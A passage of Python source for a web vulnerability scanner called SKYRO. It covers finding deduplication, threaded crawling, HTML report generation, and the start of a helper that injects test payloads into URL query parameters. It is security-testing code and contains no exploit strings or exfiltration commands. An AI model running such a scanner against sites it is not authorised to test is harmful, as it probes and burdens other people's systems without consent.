        except requests.exceptions.RequestException as e:
            self.scanned_pages_count += 1
            self.update_progress()
            self.log(f"Network error scanning {url}: {e}", "debug")
        except Exception as e:
            self.scanned_pages_count += 1
            self.update_progress()
            self.log(f"Error processing page {url}: {e}", "debug")

    def add_vulnerability(self, vuln):
        """
        Add a vulnerability to the report with proper deduplication.
        
        Uses deterministic hashing to ensure the same vulnerability
        is never counted twice, even across multiple scan runs.
        
        Args:
            vuln: Vulnerability dictionary with 'type', 'url', 'payload', etc.
        """
        canonical_url = vuln.get('url', '')
        
        # Use normalized URL for consistent hashing across runs
        try:
            normalized_url = self.normalize_url(canonical_url)
            url_hash = self.get_url_hash(canonical_url)
        except Exception as e:
            self.log(f"Error hashing URL {canonical_url}: {e}", "debug")
            url_hash = hashlib.md5(canonical_url.encode('utf-8')).hexdigest()
        
        # Create unique key: vulnerability type + URL hash
        vuln_hash_key = f"{vuln['type']}-{url_hash}"
        
        if vuln_hash_key not in self.vulnerabilities:
            # New vulnerability - add it to the report
            self.vulnerabilities[vuln_hash_key] = vuln.copy()
            self.log(f"Vulnerability Found: {vuln['type']} at {vuln['url']}", "warning")
            
            # Enrich with description, impact, and mitigation
            vuln_name = vuln['type']
            details = self.vuln_details.get(vuln_name, {
                "description": "No specific description available.",
                "impact": "No specific impact available.",
                "mitigation": "No specific mitigation available."
            })
            self.vulnerabilities[vuln_hash_key].update(details)
        else:
            # Duplicate vulnerability - merge the details
            existing = self.vulnerabilities[vuln_hash_key]
            
            # Merge payloads: add new payloads if they're different
            if vuln['payload'] != "N/A":
                if existing.get('payload') == "N/A":
                    existing['payload'] = vuln['payload']
                elif vuln['payload'] not in existing.get('payload', ''):
                    existing['payload'] = f"{existing.get('payload', '')}{'; ' if existing.get('payload') else ''}{vuln['payload']}"
            
            # Merge evidence: add new evidence if it's different
            if vuln['evidence'] != "N/A":
                if vuln['evidence'] not in existing.get('evidence', ''):
                    existing['evidence'] = f"{existing.get('evidence', '')}{'; ' if existing.get('evidence') else ''}{vuln['evidence']}"
            
            # Upgrade severity to the highest found
            severity_order = {"Critical": 5, "High": 4, "Medium": 3, "Low": 2, "Informational": 1, "N/A": 0}
            existing_sev_score = severity_order.get(existing.get('severity', 'N/A'), 0)
            new_sev_score = severity_order.get(vuln.get('severity', 'N/A'), 0)
            if new_sev_score > existing_sev_score:
                existing['severity'] = vuln['severity']
                self.log(f"Vulnerability Severity Updated: {vuln['type']} at {vuln['url']} → {vuln['severity']}", "info")
            
            self.log(f"Vulnerability Merged: {vuln['type']} at {vuln['url']}", "info")

    def scan(self):
        self.display_banner()
        
        # Authenticate if in grey-box mode
        if self.scanning_mode == 'grey-box':
            self.log(f"[GREY-BOX MODE] Attempting authentication...", "info")
            if self.authenticate():
                self.log(f"[GREY-BOX MODE] Authentication successful. Proceeding with authenticated scanning.", "success")
            else:
                self.log(f"[GREY-BOX MODE] Authentication failed. Continuing with unauthenticated access.", "warning")
        
        self.log("Discovering pages to scan...", "info")
        initial_visited = set()
        self.discover_pages(self.target_url, current_depth=0, visited_during_discovery=initial_visited)
        self.checked_urls = initial_visited.copy()
        self.log(f"Found {self.total_pages_to_scan} potential pages to scan.", "info")
        if self.total_pages_to_scan == 0:
            self.log("No pages found to scan within the specified depth and domain. Exiting.", "warning")
            return
        self.log("Scanning in progress...", "info")
        urls_to_scan_queue = list(self.checked_urls)
        self.checked_urls = set()
        self.scanned_pages_count = 0
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self.scan_page, url, 0) for url in urls_to_scan_queue}
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.log(f"Error in scanning thread: {e}", "critical")
        print("\n")
        if not self.vulnerabilities:
            self.log("No vulnerabilities found", "success")
        else:
            self.show_results()
        self.generate_html_report()
        self.log("Scan completed", "success")

    def show_results(self):
        try:
            print("\n\033[1;35mVULNERABILITIES FOUND:\033[0m")
        except UnicodeEncodeError:
            print("\nVULNERABILITIES FOUND:")
            
        for key, vuln in self.vulnerabilities.items():
            try:
                print(f"\n\033[1;31m[{vuln['severity']}] {vuln['type']}\033[0m")
            except UnicodeEncodeError:
                print(f"\n[{vuln['severity']}] {vuln['type']}")
            print(f"URL: {vuln['url']}")
            print(f"Method: {vuln.get('method', 'N/A')}")
            print(f"Payload: {vuln['payload']}")
            print(f"Evidence: {vuln['evidence']}")
            print(f"Description: {vuln.get('description', 'N/A')}")
            print(f"Impact: {vuln.get('impact', 'N/A')}")
            print(f"Mitigation: {vuln.get('mitigation', 'N/A')}")
            print("-" * 60)

    def build_sitemap_html(self):
        """
        Build a hierarchical sitemap of all scanned URLs.
        Organizes URLs by path depth and shows the complete crawl structure.
        """
        if not self.checked_urls:
            return "<p style='color: var(--muted);'>No URLs scanned.</p>"
        
        # Parse URLs and organize by path
        url_tree = {}
        for url in sorted(self.checked_urls):
            try:
                parsed = urlparse(url)
                path = parsed.path or "/"
                query = f"?{parsed.query}" if parsed.query else ""
                
                # Build tree structure
                path_parts = [p for p in path.split('/') if p]
                
                current = url_tree
                for part in path_parts[:-1]:
                    if part not in current:
                        current[part] = {}
                    current = current[part]
                
                # Add the final part with query string
                final_key = path_parts[-1] if path_parts else "/"
                if final_key not in current:
                    current[final_key] = {"__url": url}
                else:
                    current[final_key]["__url"] = url
            except Exception as e:
                self.log(f"Error processing URL for sitemap {url}: {e}", "debug")
                continue
        
        # Generate HTML tree
        sitemap_html = "<ul class='sitemap-tree'>"
        
        def build_tree_html(tree_dict, level=0):
            html = ""
            for key in sorted(tree_dict.keys()):
                if key == "__url":
                    continue
                    
                value = tree_dict[key]
                url = value.get("__url", "#")
                indent = f"margin-left: {level * 20}px"
                
                # Check if it has sub-items
                has_children = any(k != "__url" for k in value.keys())
                
                html += f"<li style='{indent}'>"
                
                if has_children:
                    html += f"<span class='tree-folder'>📁 {self.e(key)}/</span>"
                    html += "<ul class='nested'>"
                    html += build_tree_html(value, level + 1)
                    html += "</ul>"
                else:
                    html += f"<span class='tree-file'>📄 <a href='{self.e(url)}' target='_blank' title='{self.e(url)}'>{self.e(key)}</a></span>"
                
                html += "</li>"
            
            return html
        
        sitemap_html += build_tree_html(url_tree)
        sitemap_html += "</ul>"
        
        return sitemap_html

    def generate_html_report(self):
        # Generate a cryptographic nonce for inline script CSP compliance
        nonce = base64.b64encode(os.urandom(16)).decode('utf-8')
        
        # ─── Logo is embedded directly in this file ──────────────────────────
        logo_data_uri = _SKYRO_LOGO_DATA_URI
        
        # ─── Severity helpers ─────────────────────────────────────────────────
        severity_colors = {
            "Critical": "#A22F2F",
            "High":     "#FF3535",
            "Medium":   "#FF9500",
            "Low":      "#3D9BE9",
            "Informational": "#00C896",
        }
        severity_bg = {
            "Critical": "rgba(255,59,92,0.08)",
            "High":     "rgba(255,107,53,0.08)",
            "Medium":   "rgba(255,184,0,0.08)",
            "Low":      "rgba(0,200,150,0.08)",
            "Informational": "rgba(61,155,233,0.08)",
        }

        # ─── Build severity summary counts ────────────────────────────────────
        sev_counts = collections.Counter(v['severity'] for v in self.vulnerabilities.values())
        sev_order = ["Critical", "High", "Medium", "Low", "Informational"]

        # ─── Build OWASP category chart data ──────────────────────────────────
        vuln_category_counts = collections.defaultdict(int)
        for vuln in self.vulnerabilities.values():
            # Try direct lookup first
            category = self.vuln_category_map.get(vuln['type'])
            
            # If not found, infer from vulnerability type keywords
            if not category:
                vuln_type_lower = vuln['type'].lower()
                if any(x in vuln_type_lower for x in ['sql', 'xss', 'lfi', 'rfi', 'rce', 'injection', 'xxe', 'ldap', 'xpath', 'nosql', 'template', 'ssti']):
                    category = 'A05:2025-Injection'
                elif any(x in vuln_type_lower for x in ['idor', 'access control', 'broken', 'privilege', 'authorization']):
                    category = 'A01:2025-Broken Access Control'
                elif any(x in vuln_type_lower for x in ['ssrf', 'server-side', 'integrity']):
                    category = 'A08:2025-Software or Data Integrity Failures'
                elif any(x in vuln_type_lower for x in ['authentication', 'session', 'login', 'password', 'jwt', 'oauth', 'credential', 'cookie']):
                    category = 'A07:2025-Authentication Failures'
                elif any(x in vuln_type_lower for x in ['header', 'csp', 'design', 'redirect', 'csrf', 'host', 'cors', 'cache', 'clickjack']):
                    category = 'A06:2025-Insecure Design'
                elif any(x in vuln_type_lower for x in ['crypto', 'encryption', 'hash', 'secure']):
                    category = 'A04:2025-Cryptographic Failures'
                elif any(x in vuln_type_lower for x in ['disclosure', 'information', 'error', 'verbose', 'logging', 'exposure']):
                    category = 'A09:2025-Logging & Alerting Failures'
                elif any(x in vuln_type_lower for x in ['outdated', 'library', 'plugin', 'supply', 'component']):
                    category = 'A03:2025-Software Supply Chain Failures'
                else:
                    # Final fallback to Insecure Design for unknown types
                    category = 'A06:2025-Insecure Design'
            
            vuln_category_counts[category] += 1

        # Sort categories by OWASP code (A01, A02, ..., A10) instead of by count
        def extract_owasp_code(category):
            """Extract OWASP code number from category string (e.g., 'A01' from 'A01:2025-...')"""
            try:
                return int(category.split(':')[0][1:])  # Extract number from "A01" -> 01 -> 1
            except (IndexError, ValueError):
                return 999  # Put unknown categories at the end
        
        sorted_categories = sorted(vuln_category_counts.items(), key=lambda x: extract_owasp_code(x[0]))
        
        # ─── Build website sitemap ────────────────────────────────────────────
        sitemap_html = self.build_sitemap_html()

        # ─── Severity bar cards ───────────────────────────────────────────────
        sev_cards_html = ""
        for sev in sev_order:
            count = sev_counts.get(sev, 0)
            color = severity_colors.get(sev, "#888")
            sev_cards_html += f"""
            <div class="sev-card" style="border-top:3px solid {color};">
                <div class="sev-count" style="color:{color};">{count}</div>
                <div class="sev-label">{sev}</div>
            </div>"""

        # ─── OWASP summary list ───────────────────────────────────────────────
        owasp_list_html = ""
        for cat, count in sorted_categories:
            owasp_list_html += f"<li><span class='cat-name'>{self.e(cat)}</span><span class='cat-count'>{count}</span></li>"

        # ─── Vulnerability cards ──────────────────────────────────────────────
        # FIX: ALL dynamic data escaped with self.e() before HTML insertion
        vuln_cards_html = ""
        for vuln in self.vulnerabilities.values():
            sev = vuln['severity']
            color = severity_colors.get(sev, "#888")
            bg    = severity_bg.get(sev, "rgba(128,128,128,0.05)")

            vuln_cards_html += f"""
            <div class="vuln-card" data-severity="{sev}" style="border-left:4px solid {color}; background:{bg};">
                <div class="vuln-header">
                    <span class="vuln-title">{self.e(vuln['type'])}</span>
                    <span class="sev-badge" style="background:{color};">{self.e(sev)}</span>
                </div>
                <div class="vuln-grid">
                    <div class="vuln-field">
                        <span class="field-label">Endpoint</span>
                        <span class="field-value mono url-val">{self.e(vuln['url'])}</span>
                    </div>
                    <div class="vuln-field">
                        <span class="field-label">Method</span>
                        <span class="field-value mono">{self.e(vuln.get('method', 'N/A'))}</span>
                    </div>
                    <div class="vuln-field full-width">
                        <span class="field-label">Payload</span>
                        <span class="field-value mono payload-val">{self.e(vuln['payload'])}</span>
                    </div>
                    <div class="vuln-field full-width">
                        <span class="field-label">Evidence</span>
                        <span class="field-value">{self.e(vuln['evidence'])}</span>
                    </div>
                    <div class="vuln-field full-width">
                        <span class="field-label">Description</span>
                        <span class="field-value">{self.e(vuln.get('description', 'N/A'))}</span>
                    </div>
                    <div class="vuln-field full-width">
                        <span class="field-label">Impact</span>
                        <span class="field-value">{self.e(vuln.get('impact', 'N/A'))}</span>
                    </div>
                    <div class="vuln-field full-width">
                        <span class="field-label">&#x1F6E1; Mitigation</span>
                        <span class="field-value mitigation-val">{self.e(vuln.get('mitigation', 'N/A'))}</span>
                    </div>
                </div>
            </div>"""

        scan_duration = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start_time))

        # ─── Full HTML report ─────────────────────────────────────────────────
        # NOTE: The report uses Content-Security-Policy meta tag to prevent any
        # injected scripts from executing, as an additional layer of defence.
        html_report = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SECURITY: CSP with nonce allows fonts while preventing injected scripts in payload/evidence fields -->
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'none'; script-src 'self' 'nonce-{nonce}'; style-src 'unsafe-inline'; style-src-elem 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; connect-src https://fonts.googleapis.com https://fonts.gstatic.com;">
    <title>SKYRO Security Report &mdash; {self.e(self.domain)}</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {{  
            --bg:        #0D0F14;
            --surface:   #14171F;
            --surface2:  #1C2030;
            --border:    rgba(255,255,255,0.07);
            --text:      #E8EAF0;
            --muted:     #7A8099;
            --accent:    #3D9BE9;
            --font:      'Space Grotesk', sans-serif;
            --mono:      'JetBrains Mono', monospace;
        }}
        
        body.light-mode {{
            --bg:        #F5F7FA;
            --surface:   #FFFFFF;
            --surface2:  #EEF2F7;
            --border:    rgba(0,0,0,0.1);
            --text:      #1A202C;
            --muted:     #718096;
            --accent:    #2C5282;
        }}
        
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{
            font-family: var(--font);
            background: var(--bg);
            color: var(--text);
            line-height: 1.6;
            min-height: 100vh;
            transition: background-color 0.3s ease, color 0.3s ease;
        }}

        .topbar {{
            background: linear-gradient(135deg, #0A0C12 0%, #141829 100%);
            border-bottom: 1px solid var(--border);
            padding: 28px 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 24px;
            transition: background-color 0.3s ease;
        }}
        body.light-mode .topbar {{
            background: linear-gradient(135deg, #F5F7FA 0%, #EEF2F7 100%);
        }}
        .theme-toggle {{
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 6px 12px;
            cursor: pointer;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.3s ease;
        }}
        .theme-toggle:hover {{
            background: var(--surface2);
            transform: scale(1.05);
        }}
        .logo-area {{ display: flex; align-items: center; gap: 16px; }}
        .logo-mark {{
            width: 60px; height: 60px;
            background: transparent;
            border-radius: 10px;
            display: flex; align-items: center; justify-content: center;
            box-shadow: none;
            overflow: hidden;
        }}
        .logo-mark img {{
            width: 100%;
            height: 100%;
            object-fit: contain;
            object-position: center;
        }}
        .logo-text {{ font-size: 22px; font-weight: 700; letter-spacing: 0.04em; }}
        .logo-text span {{ color: var(--accent); }}
        .meta-pills {{ display: flex; gap: 10px; flex-wrap: wrap; }}
        .pill {{
            font-size: 12px; font-family: var(--mono);
            background: var(--surface2); border: 1px solid var(--border);
            border-radius: 20px; padding: 4px 12px; color: var(--muted);
        }}
        .pill strong {{ color: var(--text); }}

        /* ── Layout ──────────────────────────────────────────── */
        .page {{ max-width: 1280px; margin: 0 auto; padding: 40px 48px 80px; }}

        /* ── Section title ───────────────────────────────────── */
        .section-title {{
            font-size: 11px; font-weight: 600; letter-spacing: 0.12em;
            text-transform: uppercase; color: var(--muted);
            margin: 48px 0 20px;
        }}

        /* ── Severity summary cards ──────────────────────────── */
        .sev-cards {{ display: flex; gap: 14px; flex-wrap: wrap; margin-bottom: 8px; }}
        .sev-card {{
            flex: 1; min-width: 110px;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px 18px 16px;
            text-align: center;
        }}
        .sev-count {{ font-size: 36px; font-weight: 700; line-height: 1; }}
        .sev-label {{ font-size: 12px; color: var(--muted); margin-top: 6px; font-weight: 500; }}

        /* ── Two-column overview grid ─────────────────────────── */
        .overview-grid {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
            align-items: start;
        }}
        @media (max-width: 1200px) {{
            .overview-grid {{
                grid-template-columns: 1fr;
            }}
        }}

        /* ── Website Sitemap ──────────────────────────────────── */
        .sitemap-box {{
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 24px;
        }}
        .sitemap-box h3 {{
            font-size: 13px; font-weight: 600; color: var(--muted);
            text-transform: uppercase; letter-spacing: 0.08em;
            margin-bottom: 16px;
        }}
        .sitemap-container {{
            max-height: 500px;
            overflow-y: auto;
            padding: 12px;
            background: var(--surface2);
            border-radius: 8px;
            border: 1px solid var(--border);
        }}
        .sitemap-tree {{
            list-style: none;
            margin: 0;
            padding: 0;
            font-family: var(--mono);
            font-size: 12px;
        }}
        .sitemap-tree ul {{
            list-style: none;
            padding-left: 12px;
            border-left: 1px solid var(--border);
            margin-left: 6px;
        }}
        .sitemap-tree li {{
            padding: 4px 0;
            color: var(--text);
        }}
        .tree-folder {{
            color: #FFB800;
            font-weight: 600;
            display: block;
            padding: 4px 6px;
            margin-bottom: 2px;
        }}
        .tree-file {{
            color: var(--text);
            display: block;
            padding: 2px 6px;
        }}
        .tree-file a {{
            color: #3D9BE9;
            text-decoration: none;
            word-break: break-all;
        }}
        .tree-file a:hover {{
            color: #FF3B5C;
            text-decoration: underline;
        }}

        /* ── Category Breakdown ───────────────────────────────── */
        .category-breakdown {{
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 24px;
        }}
        .category-breakdown h3 {{
            font-size: 13px; font-weight: 600; color: var(--muted);
            text-transform: uppercase; letter-spacing: 0.08em;
            margin-bottom: 16px;
        }}
        .owasp-list-items {{
            list-style: none;
            margin: 0;
            padding: 0;
            max-height: 500px;
            overflow-y: auto;
        }}
        .owasp-list-items li {{
            display: flex; justify-content: space-between; align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid var(--border);
            font-size: 13px;
        }}
        .owasp-list-items li:last-child {{ border-bottom: none; }}
        .cat-name {{ color: var(--text); font-weight: 500; }}
        .cat-count {{
            background: var(--surface2); border: 1px solid var(--border);
            border-radius: 20px; padding: 4px 10px;
            font-size: 12px; font-family: var(--mono); color: var(--accent);
            font-weight: 600;
        }}

        /* ── Scan stats bar ──────────────────────────────────── */
        .stats-bar {{
            display: flex; gap: 0;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 8px;
        }}
        .stat-item {{
            flex: 1; padding: 18px 24px;
            border-right: 1px solid var(--border);
            text-align: center;
        }}
        .stat-item:last-child {{ border-right: none; }}
        .stat-value {{ font-size: 28px; font-weight: 700; color: var(--accent); }}
        .stat-key {{ font-size: 11px; color: var(--muted); margin-top: 2px; text-transform: uppercase; letter-spacing: 0.08em; }}

        /* ── Vulnerability cards ─────────────────────────────── */
        .vuln-card {{
            border-radius: 12px;
            border: 1px solid var(--border);
            margin-bottom: 18px;
            padding: 22px 26px;
            transition: box-shadow 0.2s;
        }}
        .vuln-card:hover {{ box-shadow: 0 4px 24px rgba(0,0,0,0.3); }}
        .vuln-header {{
            display: flex; align-items: center;
            justify-content: space-between;
            margin-bottom: 18px; gap: 12px;
        }}
        .vuln-title {{ font-size: 16px; font-weight: 600; }}
        .sev-badge {{
            font-size: 11px; font-weight: 700;
            letter-spacing: 0.08em; text-transform: uppercase;
            padding: 4px 12px; border-radius: 20px; color: #fff;
            white-space: nowrap;
        }}
        .vuln-grid {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px 24px;
        }}
        .vuln-field.full-width {{ grid-column: 1 / -1; }}
        .field-label {{
            display: block; font-size: 10px; font-weight: 600;
            letter-spacing: 0.1em; text-transform: uppercase;
            color: var(--muted); margin-bottom: 4px;
        }}
        .field-value {{
            display: block; font-size: 13px; color: var(--text);
            word-break: break-all;
        }}
        .mono {{ font-family: var(--mono); font-size: 12px; }}
        .url-val {{ color: #FF3B5C; }}
        .payload-val {{
            background: rgba(255,255,255,0.04);
            border: 1px solid var(--border);
            border-radius: 6px; padding: 6px 10px;
            color: #00C896;
        }}
        .mitigation-val {{ color: #00C896; }}

        /* ── Filter bar ──────────────────────────────────────── */
        .filter-bar {{
            display: flex; gap: 8px; flex-wrap: wrap;
            margin-bottom: 20px;
        }}
        .filter-btn {{
            font-family: var(--font); font-size: 12px; font-weight: 600;
            padding: 6px 16px; border-radius: 20px; cursor: pointer;
            border: 1px solid var(--border);
            background: var(--surface); color: var(--muted);
            transition: all 0.15s;
        }}
        .filter-btn:hover, .filter-btn.active {{
            background: var(--accent); color: #fff; border-color: var(--accent);
        }}

        /* ── Info section ────────────────────────────────────────────────── */
        .info-section {{
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 24px;
            margin-bottom: 40px;
        }}
        .info-section h3 {{
            font-size: 13px; font-weight: 600; color: var(--muted);
            text-transform: uppercase; letter-spacing: 0.08em;
            margin-bottom: 18px;
        }}
        .info-cards {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 18px;
        }}
        .info-card {{
            background: var(--surface2);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 16px;
        }}
        .info-card h4 {{
            font-size: 13px; font-weight: 600; color: var(--accent);
            margin-bottom: 8px;
        }}
        .info-card p {{
            font-size: 12px; color: var(--muted);
            line-height: 1.5;
        }}
        .info-card code {{
            background: rgba(61, 155, 233, 0.15);
            padding: 4px 8px;
            border-radius: 4px;
            font-family: var(--mono);
            color: #64B5F6;
            font-weight: 600;
            display: inline-block;
            border: 1px solid rgba(100, 181, 246, 0.3);
        }}
        .info-card .example {{
            margin-top: 10px;
            padding: 10px;
            background: rgba(0,0,0,0.2);
            border-left: 2px solid var(--accent);
            border-radius: 4px;
            font-size: 11px;
            font-family: var(--mono);
            color: #3D9BE9;
            overflow-x: auto;
        }}
        
        /* ── Footer ──────────────────────────────────────────── */
        .footer {{
            margin-top: 60px; padding-top: 24px;
            border-top: 1px solid var(--border);
            text-align: center;
            font-size: 12px; color: var(--muted);
        }}
        .footer strong {{ color: var(--text); }}
    </style>
</head>
<body>

<div class="topbar">
    <div class="logo-area">
        <div class="logo-mark"><img src="{logo_data_uri}" alt="SKYRO Scanner Logo" title="SKYRO Scanner"></div>
        <div class="logo-text">SKY<span>RO</span></div>
    </div>
    <div class="meta-pills">
        <div class="pill">Date: <strong>{self.e(self.scan_date)}</strong></div>
        <div class="pill">Duration: <strong>{self.e(scan_duration)}</strong></div>
        <div class="pill">Depth: <strong>{self.e(str(self.max_depth))}</strong></div>
        <div class="pill">Threads: <strong>{self.e(str(self.max_threads))}</strong></div>
    </div>
    <button class="theme-toggle" id="theme-toggle" title="Toggle Dark/Light Mode">🌙</button>
</div>

<div class="page">

    <!-- Scan stats -->
    <div class="pill">Target: <strong>{self.e(self.target_url)}</strong></div>
    <div class="section-title">Scan Statistics</div>
    <div class="stats-bar">
        <div class="stat-item">
            <div class="stat-value">{self.total_pages_to_scan}</div>
            <div class="stat-key">Pages Discovered</div>
        </div>
        <div class="stat-item">
            <div class="stat-value">{self.scanned_pages_count}</div>
            <div class="stat-key">Pages Scanned</div>
        </div>
        <div class="stat-item">
            <div class="stat-value">{len(self.vulnerabilities)}</div>
            <div class="stat-key">Vulnerabilities Found</div>
        </div>
        <div class="stat-item">
            <div class="stat-value">{scan_duration}</div>
            <div class="stat-key">Scan Duration</div>
        </div>
    </div>

    <!-- Severity summary -->
    <div class="section-title">Severity Breakdown</div>
    <div class="sev-cards">
        {sev_cards_html}
    </div>

    <!-- Overview -->
    <div class="section-title">Vulnerability Overview</div>
    <div class="overview-grid">
        <div class="sitemap-box">
            <h3>Website Sitemap</h3>
            <div class="sitemap-container">
                {sitemap_html}
            </div>
        </div>
        <div class="category-breakdown">
            <h3>OWASP TOP 10 2025 Category Breakdown</h3>
            <ul class="owasp-list-items">{owasp_list_html}</ul>
        </div>
    </div>

    <!-- Findings -->
    <div class="section-title">Detailed Findings</div>

    <div class="filter-bar" id="filter-bar">
        <button class="filter-btn active" data-filter="all">All</button>
        <button class="filter-btn" data-filter="Critical" style="color:#FF3B5C;">Critical</button>
        <button class="filter-btn" data-filter="High" style="color:#FF6B35;">High</button>
        <button class="filter-btn" data-filter="Medium" style="color:#FFB800;">Medium</button>
        <button class="filter-btn" data-filter="Low" style="color:#00C896;">Low</button>
    </div>

    <div id="findings">
        {vuln_cards_html}
    </div>

    <!-- Scanning Options Info -->
    <div class="info-section">
        <h3>📋 Scanning Options Used</h3>
        <div class="info-cards">
            <div class="info-card">
                <h4>Crawling Depth (-d, --depth)</h4>
                <p>Controls how deep the scanner crawls into the website's page hierarchy. Higher depth means more pages will be discovered and scanned.</p>
                <p><strong>Current:</strong> <code>{self.e(str(self.max_depth))}</code></p>
                <div class="example">
                <strong>Examples:</strong><br/>
                Depth 1: Home page only<br/>
                Depth 2: Home + linked pages<br/>
                Depth 3+: Deep site crawling (default)
                </div>
            </div>
            <div class="info-card">
                <h4>Thread Count (-t, --threads)</h4>
                <p>Number of concurrent threads used for scanning. More threads = faster scanning, but may increase server load.</p>
                <p><strong>Current:</strong> <code>{self.e(str(self.max_threads))}</code></p>
                <div class="example">
                <strong>Recommendations:</strong><br/>
                1-2: Safe (minimal load)<br/>
                5: Balanced (default)<br/>
                10+: Aggressive (higher load)
                </div>
            </div>
            <div class="info-card">
                <h4>Scanning Mode (-m, --mode)</h4>
                <p>Determines whether the scanner performs unauthenticated (black-box) or authenticated (grey-box) testing.</p>
                <p><strong>Current:</strong> <code>{self.e(self.scanning_mode.upper())}</code></p>
                <div class="example">
                <strong>Modes:</strong><br/>
                black-box: Unauthenticated testing (default)<br/>
                grey-box: Authenticated testing with credentials
                </div>
            </div>
            <div class="info-card">
                <h4>How to Run Custom Scans</h4>
                <p>Use command-line arguments to customize your scan parameters:</p>
                <div class="example">
                <strong>Syntax:</strong><br/>
                python skyro.py [URL] -d [DEPTH] -t [THREADS] -m [MODE] -u [USERNAME] -p [PASSWORD]<br/><br/>
                <strong>Black-box Examples:</strong><br/>
                python skyro.py http://example.com -d 2 -t 3<br/>
                python skyro.py https://target.com -d 5 -t 10<br/><br/>
                <strong>Grey-box Examples:</strong><br/>
                python skyro.py http://example.com -m grey-box -u admin -p password123<br/>
                python skyro.py https://target.com -m grey-box -u testuser -p test@1234
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>Generated by <strong>SKYRO Security Scanner v1.0</strong> &mdash; Developed by Vikash Kumar Ray</p>
    </div>
</div>

<script nonce="{nonce}">
// ── Global severity filter function ─────────────────────────────────────
// ── Theme Switcher ────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', function() {{
    const themeToggle = document.getElementById('theme-toggle');
    const currentTheme = localStorage.getItem('theme') || 'dark';
    
    // Set initial theme from localStorage
    if (currentTheme === 'light') {{
        document.body.classList.add('light-mode');
        if (themeToggle) themeToggle.textContent = '🌙';
    }} else {{
        document.body.classList.remove('light-mode');
        if (themeToggle) themeToggle.textContent = '☀️';
    }}
    
    // Toggle theme on button click
    if (themeToggle) {{
        themeToggle.addEventListener('click', function() {{
            const isLightMode = document.body.classList.toggle('light-mode');
            const newTheme = isLightMode ? 'light' : 'dark';
            localStorage.setItem('theme', newTheme);
            themeToggle.textContent = isLightMode ? '🌙' : '☀️';
            console.log('Theme switched to:', newTheme);
        }});
    }}
    
    console.log('Theme system initialized, current theme:', currentTheme);
}}); 

window.filterVulns = function(sev) {{
    console.log('Filter triggered with severity:', sev);
    
    // Remove active class from all buttons
    document.querySelectorAll('.filter-btn').forEach(btn => {{
        btn.classList.remove('active');
    }});
    
    // Mark the clicked button as active
    const activeBtn = document.querySelector(`.filter-btn[data-filter="${{sev}}"]`);
    if (activeBtn) {{
        activeBtn.classList.add('active');
        console.log('Activated button for:', sev);
    }} else {{
        console.warn('Could not find button with data-filter:', sev);
    }}
    
    // Filter vulnerability cards
    const sevUpper = sev.toUpperCase();
    let visibleCount = 0;
    let hiddenCount = 0;
    
    document.querySelectorAll('.vuln-card').forEach(card => {{
        const cardSev = card.getAttribute('data-severity');
        if (!cardSev) {{
            console.warn('Card missing data-severity:', card);
            return;
        }}
        const cardSevUpper = cardSev.toUpperCase();
        const shouldShow = (sevUpper === 'ALL') || (cardSevUpper === sevUpper);
        
        if (shouldShow) {{
            card.style.display = 'block';
            visibleCount++;
        }} else {{
            card.style.display = 'none';
            hiddenCount++;
        }}
    }});
    
    console.log(`Filter applied - Visible: ${{visibleCount}}, Hidden: ${{hiddenCount}}`);
}};

// ── Initialize on DOM ready ─────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', function() {{
    console.log('DOM loaded, initializing filters and chart...');
    
    try {{
        // Show all vulnerability cards initially
        document.querySelectorAll('.vuln-card').forEach(card => {{
            card.style.display = 'block';
        }});
        console.log('All vulnerability cards set to visible');
        
        // Attach event listeners to filter buttons (CSP-compliant)
        const filterButtons = document.querySelectorAll('.filter-btn');
        console.log('Found filter buttons:', filterButtons.length);
        
        filterButtons.forEach(btn => {{
            btn.addEventListener('click', function(e) {{
                e.preventDefault();
                const severity = this.getAttribute('data-filter');
                console.log('Button clicked, calling filterVulns with:', severity);
                window.filterVulns(severity);
            }});
        }});
        console.log('Filter button event listeners attached');
    }} catch (err) {{
        console.error('Error initializing filters:', err);
    }}
    
    console.log('Page initialization complete');
}});
</script>
</body>
</html>"""

        report_file = f"skyro_report_{self.domain}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_file, "w", encoding='utf-8') as f:
            f.write(html_report)
        self.log(f"HTML report saved to {report_file}", "success")

    def _generate_param_injections(self, url, payload):
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query, keep_blank_values=True)
            injected_urls = []
            if not query_params:
                return injected_urls
            for param_name, values in query_params.items():
                try:
                    modified_values = [f"{payload}{v}" for v in values]
                    temp_params = query_params.copy()
                    temp_params[param_name] = modified_values
                    try:
                        new_query = urlencode(temp_params, doseq=True)
